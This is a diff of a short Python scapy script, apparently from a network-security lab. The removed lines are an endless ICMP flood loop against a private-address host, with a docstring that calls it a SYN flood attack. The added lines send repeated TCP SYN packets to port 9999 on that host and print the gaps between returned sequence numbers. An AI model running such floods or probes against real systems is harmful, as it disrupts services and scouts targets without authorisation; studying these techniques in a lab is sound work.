@@ -1,16 +1,12 @@
-"""
-Authors : Fridez Lucas, Maxime Welcklen
-Attack : SYN attack, similar to ICMP flood - flood the server with TCP syn request (to receive acks)
-"""
 from scapy.all import *
-import sys
+from scapy.layers.inet import *
+
+# [print(f"{p.summary()} with ttl {p.ttl}") for p in IP(ttl=(1,5))/ICMP()]
 
 
-IP_source = "192.168.1.111"
-IP_dest = "192.168.1.103"
-C = RandShort() # source port
-D = 9999 # destination port
+ans, unans = srloop(IP(dst="192.168.1.103")/TCP(dport=9999,flags="S"))
 
-#Send ICMP packet
-while True:
-    send(IP(src=IP_source, dst=IP_dest) / ICMP(), iface="enp0s3")
+temp = 0
+for s, r in ans:
+   temp = r[TCP].seq - temp
+   print("%d\t+%d" % (r[TCP].seq, temp))
